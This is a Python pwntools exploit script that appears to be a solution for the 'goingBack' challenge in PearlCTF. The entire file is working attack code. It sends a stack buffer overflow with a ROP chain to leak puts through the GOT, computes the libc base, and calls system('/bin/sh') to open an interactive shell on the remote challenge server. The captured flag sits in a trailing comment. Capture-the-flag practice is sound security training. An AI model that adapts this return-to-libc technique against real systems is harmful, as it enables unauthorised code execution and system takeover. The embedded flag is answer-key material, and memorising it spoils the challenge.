#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./goingBack_patched")
libc = ELF("./libc.6.so")

context.binary = exe

REMOTE_NC_CMD    = "nc dyn.ctf.pearlctf.in 30011"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    POP_RDI = p64(0x0000000000401265)
    RET = p64(0x000000000040101a)

    r.sendline(bstr(0))
    r.sendline(bstr(0))
    r.sendline(bstr(0))
    r.sendline(bstr(0))
    r.sendline(bstr(0))
    r.sendline(bstr(0))

    payload = b"A"*40 + POP_RDI + p64(exe.got.puts) + p64(exe.plt.puts) + p64(0x401130)
    r.sendline(payload)
    r.recvuntil(b"Please help us to improve your future experience\n")
    leak = u64(r.recvline()[:-1].ljust(8, b"\x00"))

    libc.address = leak - libc.sym.puts

    r.sendline(bstr(0))
    r.sendline(bstr(0))
    r.sendline(bstr(0))
    r.sendline(bstr(0))
    r.sendline(bstr(0))
    r.sendline(bstr(0))

    payload = b"A"*40 + POP_RDI + p64(libc.binsh()) + RET + p64(libc.sym.system)
    r.sendline(payload)
    r.clean()
    r.interactive()
    #pearl{r3turn_70_l1bc_1s_e4szzyy_p3azyyy!!!!}

if __name__ == "__main__":
    main()